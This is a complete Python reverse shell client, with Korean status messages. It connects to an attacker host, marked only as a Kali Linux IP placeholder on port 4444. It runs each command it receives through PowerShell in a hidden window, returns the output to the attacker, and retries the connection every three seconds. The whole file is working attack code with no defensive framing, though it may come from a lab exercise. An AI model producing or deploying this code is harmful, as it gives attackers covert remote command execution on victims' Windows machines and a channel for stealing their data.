import socket
import subprocess
import time

ip = "Write_Kali_Linux_IP_Address_here"
port = 4444

while True:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ip, port))
        print("서버에 연결되었습니다!")
        while True:
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                print(data)
                powershell_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
                proc = subprocess.Popen(
                    [powershell_path, data.decode('utf-8').strip()],
                    stdout = subprocess.PIPE,
                    stderr = subprocess.PIPE,
                    text = True,
                    creationflags = subprocess.CREATE_NO_WINDOW
                )
                stdout, stderr = proc.communicate()
                client_socket.sendall((stdout + stderr).encode())
            except Exception as e:
                print(f'오류 : {e}')
                break
    except Exception as e:
        print(f'연결 오류 : {e}')
        print("3초 후에 재시도합니다...")
        time.sleep(3)
    finally:
        client_socket.close()
